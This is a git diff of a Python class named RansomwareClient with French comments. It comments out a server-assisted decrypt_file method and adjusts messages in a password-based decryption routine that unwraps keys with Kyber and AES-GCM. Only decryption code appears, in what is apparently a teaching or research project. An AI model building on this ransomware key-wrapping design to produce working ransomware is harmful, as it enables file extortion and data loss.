@@ -280,77 +280,78 @@ class RansomwareClient:
         # Supprime .meta
         meta_path.unlink()
 
-    def decrypt_file(self, file_path: str) -> None:
-        """
-        Déchiffre un seul fichier en demandant la clé au serveur
+    # Méthode plus utilisée car utilisation de la fonction avec mot de passe
+    # def decrypt_file(self, file_path: str) -> None:
+    #     """
+    #     Déchiffre un seul fichier en demandant la clé au serveur
 
-        Args:
-            file_path: Chemin du fichier à déchiffrer (ou son .meta)
-        """
-        # Vérifie si c'est .meta ou fichier chiffré
-        file_path_obj = Path(file_path).resolve()
+    #     Args:
+    #         file_path: Chemin du fichier à déchiffrer (ou son .meta)
+    #     """
+    #     # Vérifie si c'est .meta ou fichier chiffré
+    #     file_path_obj = Path(file_path).resolve()
 
-        if file_path_obj.name.endswith(config.META_EXTENSION):
-            meta_path = file_path_obj
-            encrypted_path = meta_path.with_suffix('')
-        else:
-            encrypted_path = file_path_obj
-            meta_path = Path(str(encrypted_path) + config.META_EXTENSION)
+    #     if file_path_obj.name.endswith(config.META_EXTENSION):
+    #         meta_path = file_path_obj
+    #         encrypted_path = meta_path.with_suffix('')
+    #     else:
+    #         encrypted_path = file_path_obj
+    #         meta_path = Path(str(encrypted_path) + config.META_EXTENSION)
 
-        if not meta_path.exists():
-            raise FileNotFoundError(f"Fichier métadonnées {meta_path} pas trouvé")
+    #     if not meta_path.exists():
+    #         raise FileNotFoundError(f"Fichier métadonnées {meta_path} pas trouvé")
 
-        if not encrypted_path.exists():
-            raise FileNotFoundError(f"Fichier chiffré {encrypted_path} pas trouvé")
+    #     if not encrypted_path.exists():
+    #         raise FileNotFoundError(f"Fichier chiffré {encrypted_path} pas trouvé")
 
-        print(f"\n[CLT] Déchiffrement fichier {encrypted_path.name}")
+    #     print(f"\n[CLT] Déchiffrement fichier {encrypted_path.name}")
 
-        # Lit métadonnées
-        with open(meta_path, 'r') as f:
-            metadata = json.load(f)
+    #     # Lit métadonnées
+    #     with open(meta_path, 'r') as f:
+    #         metadata = json.load(f)
 
-        wrapped_key_ciphertext = base64.b64decode(metadata["wrapped_key_ciphertext"])
-        wrapped_key_nonce = base64.b64decode(metadata["wrapped_key_nonce"])
-        wrapped_key_tag = base64.b64decode(metadata["wrapped_key_tag"])
+    #     wrapped_key_ciphertext = base64.b64decode(metadata["wrapped_key_ciphertext"])
+    #     wrapped_key_nonce = base64.b64decode(metadata["wrapped_key_nonce"])
+    #     wrapped_key_tag = base64.b64decode(metadata["wrapped_key_tag"])
 
-        # kyber_ciphertext depuis rootkey.bin
-        if not self.rootkey_path.exists():
-            raise FileNotFoundError(f"Le fichier {config.ROOTKEY_FILENAME} n'existe pas")
+    #     # kyber_ciphertext depuis rootkey.bin
+    #     if not self.rootkey_path.exists():
+    #         raise FileNotFoundError(f"Le fichier {config.ROOTKEY_FILENAME} n'existe pas")
 
-        with open(self.rootkey_path, 'r') as f:
-            rootkey_data = json.load(f)
+    #     with open(self.rootkey_path, 'r') as f:
+    #         rootkey_data = json.load(f)
 
-        kyber_ciphertext = base64.b64decode(rootkey_data["kyber_ciphertext"])
+    #     kyber_ciphertext = base64.b64decode(rootkey_data["kyber_ciphertext"])
 
-        # Serveur désencapsule la clé
-        print("[CLT] Désencapsule clé fichier")
-        file_key = server.request_file_key_unwrap(wrapped_key_ciphertext, wrapped_key_nonce, wrapped_key_tag, kyber_ciphertext)
+    #     # Serveur désencapsule la clé
+    #     print("[CLT] Désencapsule clé fichier")
+    #     file_key = server.request_file_key_unwrap(wrapped_key_ciphertext, wrapped_key_nonce, wrapped_key_tag, kyber_ciphertext)
 
-        # Lit fichier chiffré
-        with open(encrypted_path, 'rb') as f:
-            ciphertext = f.read()
+    #     # Lit fichier chiffré
+    #     with open(encrypted_path, 'rb') as f:
+    #         ciphertext = f.read()
 
-        # Déchiffre fichier
-        nonce = base64.b64decode(metadata["nonce"])
-        tag = base64.b64decode(metadata["tag"])
+    #     # Déchiffre fichier
+    #     nonce = base64.b64decode(metadata["nonce"])
+    #     tag = base64.b64decode(metadata["tag"])
 
-        plaintext = crypto_utils.decrypt_aes_gcm(ciphertext, file_key, nonce, tag)
+    #     plaintext = crypto_utils.decrypt_aes_gcm(ciphertext, file_key, nonce, tag)
 
-        # Écrase fichier avec contenu normal
-        with open(encrypted_path, 'wb') as f:
-            f.write(plaintext)
+    #     # Écrase fichier avec contenu normal
+    #     with open(encrypted_path, 'wb') as f:
+    #         f.write(plaintext)
 
-        # Supprime .meta
-        meta_path.unlink()
+    #     # Supprime .meta
+    #     meta_path.unlink()
 
-        print(f"[CLT] Fichier déchiffré {encrypted_path}")
+    #     print(f"[CLT] Fichier déchiffré {encrypted_path}")
 
     def decrypt_file_with_password(self, file_path: str) -> None:
         """
-        Déchiffre un seul fichier en utilisant le mot de passe
+        Déchiffre un seul fichier en utilisant mdp
 
         Args:
-            file_path: Chemin du fichier à déchiffrer (ou son .meta)
+            file_path: Chemin du fichier à déchiffrer ou .meta
         """
         # Vérifie si c'est .meta ou fichier chiffré
         file_path_obj = Path(file_path).resolve()
@@ -368,7 +369,7 @@ class RansomwareClient:
         if not encrypted_path.exists():
             raise FileNotFoundError(f"Fichier chiffré {encrypted_path} pas trouvé")
 
-        print(f"\n[CLT] Déchiffrement fichier avec mot de passe : {encrypted_path.name}")
+        print(f"\n[CLT] Déchiffrement fichier avec mot de passe {encrypted_path.name}")
 
         # Credentials au serveur
         credentials = server.request_full_decryption_credentials()
@@ -400,11 +401,11 @@ class RansomwareClient:
         print("[CLT] Désencapsule RK")
         root_key = crypto_utils.unwrap_key_aes_gcm(wrapped_rk_ciphertext, master_key, wrapped_rk_nonce, wrapped_rk_tag)
 
-        # Déchiffre le fichier
+        # Déchiffre fichier
         print("[CLT] Déchiffre le fichier")
         self._decrypt_file_with_rk(encrypted_path, meta_path, root_key)
 
-        print(f"[CLT] Fichier déchiffré avec succès : {encrypted_path}")
+        print(f"[CLT] Fichier déchiffré {encrypted_path}")
 
     def change_password(self) -> None:
         """
